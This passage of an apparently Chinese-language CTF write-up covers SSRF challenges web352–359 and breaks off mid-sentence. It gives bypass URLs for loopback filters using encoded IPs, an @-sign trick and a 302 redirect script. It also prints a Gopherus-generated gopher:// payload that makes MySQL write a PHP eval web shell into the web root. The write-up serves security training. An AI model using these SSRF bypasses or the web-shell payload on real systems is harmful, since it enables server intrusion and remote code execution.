class="variable">$url</span> [, <span class="keyword">int</span> <span class="variable">$component</span> = -<span class="number">1</span> ] )</span><br></pre></td></tr></table></figure><p>​本函数解析一个 URL 并返回一个关联数组，包含在 URL 中出现的各种组成部分。</p><p>​这道题过滤了 localhost 和 127.0.0，绕过方式挺多的：</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">url=http://0x7F.0.0.1/flag.php   16进制</span><br><span class="line">url=http://0177.0.0.1/flag.php    8进制</span><br><span class="line">url=http://0.0.0.0/flag.php</span><br><span class="line">url=http://0/flag.php</span><br><span class="line">url=http://127.127.127.127/flag.php</span><br></pre></td></tr></table></figure><h1 id="web353"><a class="markdownIt-Anchor" href="#web353">#</a> web353：</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/localhost|127\.0\.|\。/i&#x27;</span>, <span class="variable">$url</span>))&#123;</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>​过滤了 127.0. 和句号，那么，绕过有下面的：<span class="exturl" data-url="aHR0cHM6Ly90b29sLjUyMDEwMS5jb20vd2FuZ2x1by9qaW56aGl6aHVhbmh1YW4v">IP 地址进制转换网站</span></p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">十六进制</span><br><span class="line">url=http://0x7F.0.0.1/flag.php</span><br><span class="line">八进制</span><br><span class="line">url=http://0177.0.0.1/flag.php</span><br><span class="line">10 进制整数格式</span><br><span class="line">url=http://2130706433/flag.php</span><br><span class="line">16 进制整数格式，还是上面那个网站转换记得前缀0x</span><br><span class="line">url=http://0x7F000001/flag.php</span><br><span class="line">还有一种特殊的省略模式</span><br><span class="line">127.0.0.1写成127.1</span><br><span class="line">用CIDR绕过localhost</span><br><span class="line">url=http://127.127.127.127/flag.php</span><br><span class="line">url=http://0/flag.php</span><br><span class="line">url=http://0.0.0.0/flag.php</span><br></pre></td></tr></table></figure><h1 id="web354"><a class="markdownIt-Anchor" href="#web354">#</a> web354：</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/localhost|1|0|。/i&#x27;</span>, <span class="variable">$url</span>))&#123;</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>​过滤了 1 和 0，之类可以利用解析到 127.0.0.1 的域名作为绕过或者 302，前者：<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzYxNzc4MTI4L2FydGljbGUvZGV0YWlscy8xMjM5MjMzMTY/b3BzX3JlcXVlc3RfbWlzYz0lMjU3QiUyNTIycmVxdWVzdCUyNTVGaWQlMjUyMiUyNTNBJTI1MjJDRDc2ODYyMy1EQjQzLTRFRTMtQTkzRi05REE3QUFCNzBGRTElMjUyMiUyNTJDJTI1MjJzY20lMjUyMiUyNTNBJTI1MjIyMDE0MDcxMy4xMzAxMDIzMzQucGMlMjU1RmFsbC4lMjUyMiUyNTdEJmFtcDtyZXF1ZXN0X2lkPUNENzY4NjIzLURCNDMtNEVFMy1BOTNGLTlEQTdBQUI3MEZFMSZhbXA7Yml6X2lkPTAmYW1wO3V0bV9tZWRpdW09ZGlzdHJpYnV0ZS5wY19zZWFyY2hfcmVzdWx0Lm5vbmUtdGFzay1ibG9nLTJ+YWxsfmZpcnN0X3JhbmtfZWNwbV92MX5yYW5rX3YzMV9lY3BtLTEtMTIzOTIzMzE2LW51bGwtbnVsbC4xNDIlNUV2MTAwJTVFcGNfc2VhcmNoX3Jlc3VsdF9iYXNlNiZhbXA7dXRtX3Rlcm09JUU1JThGJUFGJUU0JUJCJUE1JUU4JUE3JUEzJUU2JTlFJTkwJUU1JTg4JUIwMTI3LjAuMC4xJUU3JTlBJTg0JUU1JTlGJTlGJUU1JTkwJThEJmFtcDtzcG09MTAxOC4yMjI2LjMwMDEuNDE4Nw==">SSRF 域名解析到 127.0.0.1</span>，</p><p>​这里的 payload ：<span class="exturl" data-url="aHR0cDovL3NhZmUudGFvYmFvLmNvbS9mbGFnLnBocCVFMyU4MCU4Mg==">http://safe.taobao.com/flag.php。</span></p><h1 id="web355"><a class="markdownIt-Anchor" href="#web355">#</a> web355：</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$host</span>=<span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>((<span class="title function_ invoke__">strlen</span>(<span class="variable">$host</span>)&lt;=<span class="number">5</span>))&#123;</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>​这里要求长度小于五，直接用 http://0/flag.php 去绕过。</p><h1 id="web356"><a class="markdownIt-Anchor" href="#web356">#</a> web356：</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$host</span>=<span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>((<span class="title function_ invoke__">strlen</span>(<span class="variable">$host</span>)&lt;=<span class="number">3</span>))&#123;</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>​长度小于 3，还是上一题那个 payload 一把梭。</p><h1 id="web357"><a class="markdownIt-Anchor" href="#web357">#</a> web357：</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">gethostbyname</span>(<span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/br&gt;&#x27;</span>.<span class="variable">$ip</span>.<span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">filter_var</span>(<span class="variable">$ip</span>, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;ip!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;scheme&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>​ai 的解释如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="comment">// 关闭PHP的错误报告，这意味着任何错误或警告都不会显示给用户  </span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// 高亮显示当前文件的源代码。这通常用于调试目的，但在生产环境中显示源代码是不安全的。  </span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// 从POST请求中获取名为&#x27;url&#x27;的参数值，并将其存储在变量$url中  </span></span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// 使用parse_url函数解析$url，并将解析结果存储在数组$x中  </span></span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// 检查$x数组中的&#x27;scheme&#x27;键是否等于&#x27;http&#x27;或&#x27;https&#x27;  </span></span><br><span class="line"><span class="comment">// 这是为了确保只处理HTTP或HTTPS协议的URL，从而避免潜在的协议漏洞（如URL重定向攻击）  </span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;  </span><br><span class="line">    <span class="comment">// 使用gethostbyname函数获取$url中主机名的IP地址，并将其存储在变量$ip中  </span></span><br><span class="line">    <span class="variable">$ip</span> = <span class="title function_ invoke__">gethostbyname</span>(<span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>]);  </span><br><span class="line">      </span><br><span class="line">    <span class="comment">// 输出获取的IP地址，前面加上HTML的换行标签  </span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;/br&gt;&#x27;</span>.<span class="variable">$ip</span>.<span class="string">&#x27;&lt;/br&gt;&#x27;</span>;  </span><br><span class="line">      </span><br><span class="line">    <span class="comment">// 使用filter_var函数和FILTER_VALIDATE_IP过滤器来验证$ip是否为有效的IP地址  </span></span><br><span class="line">    <span class="comment">// 同时，使用FILTER_FLAG_NO_PRIV_RANGE和FILTER_FLAG_NO_RES_RANGE标志来排除私有和保留的IP地址范围  </span></span><br><span class="line">    <span class="comment">// 如果$ip不是有效的非私有/非保留IP地址，则执行die函数，终止脚本执行并输出&#x27;ip!&#x27;  </span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">filter_var</span>(<span class="variable">$ip</span>, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) &#123;  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;ip!&#x27;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">      </span><br><span class="line">    <span class="comment">// 如果IP地址验证通过，则使用file_get_contents函数尝试从用户提交的URL中获取内容，并输出  </span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="comment">// 如果$url的协议不是HTTP或HTTPS，则执行die函数，终止脚本执行并输出&#x27;scheme&#x27;  </span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;scheme&#x27;</span>);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>​这里打 302 跳转，在公网服务器上写入如下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: http://127.0.0.1:80/flag.php&quot;</span>,<span class="literal">TRUE</span>,<span class="number">302</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>​之后使用如下命令临时运行：</p><blockquote><p>php -S 0.0.0.0:2333</p></blockquote><p>​传入 url 参数为：</p><blockquote><p>url=http://&lt;vps_ip&gt;: 端口</p></blockquote><h1 id="web358"><a class="markdownIt-Anchor" href="#web358">#</a> web358：</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^http:\/\/ctf\..*show$/i&#x27;</span>,<span class="variable">$url</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>​这里使用正则表达式检查 $url 是否以 &quot;<span class="exturl" data-url="aHR0cDovL2N0Zg==">http://ctf</span>.“开头，并且以”.show&quot; 结尾（不区分大小写）， 前面呢就利用 @符号就可以绕过，后面利用 get 传参方式绕过：</p><blockquote><p><span class="exturl" data-url="aHR0cDovL2N0Zi5AMTI3LjAuMC4xL2ZsYWcucGhwP3Nob3c=">http://ctf.@127.0.0.1/flag.php?show</span></p></blockquote><h1 id="web359"><a class="markdownIt-Anchor" href="#web359">#</a> web359：</h1><p>​随便输入了一个账号密码后，跳转到 check.php 文件，抓包后 post 出现了一个 returl，由此，利用 gopher 协议构造攻击，利用 gopherus 生成 gopher 语句攻击。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿MSI)-[/home/g01den/Tools/Gopherus]</span><br><span class="line">└─# python2 gopherus.py --exploit mysql</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  ________              .__</span><br><span class="line"> /  _____/  ____ ______ |  |__   ___________ __ __  ______</span><br><span class="line">/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/</span><br><span class="line">\    \_\  (  &lt;_&gt; )  |_&gt; &gt;   Y  \  ___/|  | \/  |  /\___ \</span><br><span class="line"> \______  /\____/|   __/|___|  /\___  &gt;__|  |____//____  &gt;</span><br><span class="line">        \/       |__|        \/     \/                 \/</span><br><span class="line"></span><br><span class="line">                author: $_SpyD3r_$</span><br><span class="line"></span><br><span class="line">For making it work username should not be password protected!!!</span><br><span class="line"></span><br><span class="line">Give MySQL username: root</span><br><span class="line">Give query to execute: select &quot;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&quot; into outfile &#x27;/var/www/html/2.php&#x27;;</span><br><span class="line"></span><br><span class="line">Your gopher link is ready to do SSRF :</span><br><span class="line"></span><br><span class="line">gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%4c%00%00%00%03%73%65%6c%65%63%74%20%22%3c%3f%70%68%70%20%40%65%76%61%6c%28%24%5f%50%4f%53%54%5b%22%63%6d%64%22%5d%29%3b%3f%e3%3e%22%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%27%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%32%2e%70%68%70%27%3b%01%00%00%00%01</span><br><span class="line"></span><br><span class="line">-----------Made-by-SpyD3r-----------</span><br></pre></td></tr></table></figure><p>​生成的 gopher 协议不能直接用，需要经过 url 编码之后才能用：</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:3306/<span class="built_in">_</span><span class="comment">%25a3%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2572%256f%256f%2574%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%254c%2500%2500%2500%2503%2573%2565%256c%2565%2563%2574%2520%2522%253c%253f%2570%2568%2570%2520%2540%2565%2576%2561%256c%2528%2524%255f%2550%254f%2553%2554%255b%2522%2563%256d%2564%2522%255d%2529%253b%253f%25e3%253e%2522%2520%2569%256e%2574%256f%2520%256f%2575%2574%2566%2569%256c%2565%2520%2527%252f%2576%2561%2572%252f%2577%2577%2577%252f%2568%2574%256d%256c%252f%2532%252e%2570%2568%2570%2527%253b%2501%2500%2500%2500%2501</span></span><br></pre></td></tr></table></figure><p>​不知道为啥，我自己的 payload 